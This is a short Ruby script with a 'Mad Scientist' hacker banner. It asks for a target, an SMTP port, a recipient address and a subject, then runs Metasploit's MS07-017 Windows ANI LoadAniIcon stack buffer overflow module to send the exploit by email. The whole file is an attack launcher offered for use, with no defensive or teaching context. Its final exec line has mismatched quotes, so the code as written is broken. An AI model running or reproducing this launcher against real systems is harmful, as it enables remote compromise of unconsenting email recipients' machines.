require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
           Windows ANI LoadAniIcon() 
     Chunk Size Stack Buffer Overflow (SMTP)
""".red
puts """
	 1st Try {set RPORT 25; 2nd RPORT 465}""".white


puts " [?] What is the target? "
print "[!] --->"
target = gets.chomp

puts " [?] Which SMTP server port (e.g. 25, 465, 587, 2525)? "
print " [!] ---> "
port = gets.chomp

puts " [?] The TO address of the email? "
print " [!] ---> "
email = gets.chomp


puts " [?] Subject line of the email? "
print " [!] ---> "
subject = gets.chomp



exec(msfconsole -x "exploit/windows/email/ms07_017_ani_loadimage_chunksize' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'set MAILTO #{email}' -x 'set SUBJECT #{subject}' -x 'set VERBOSE true' -x 'run'")

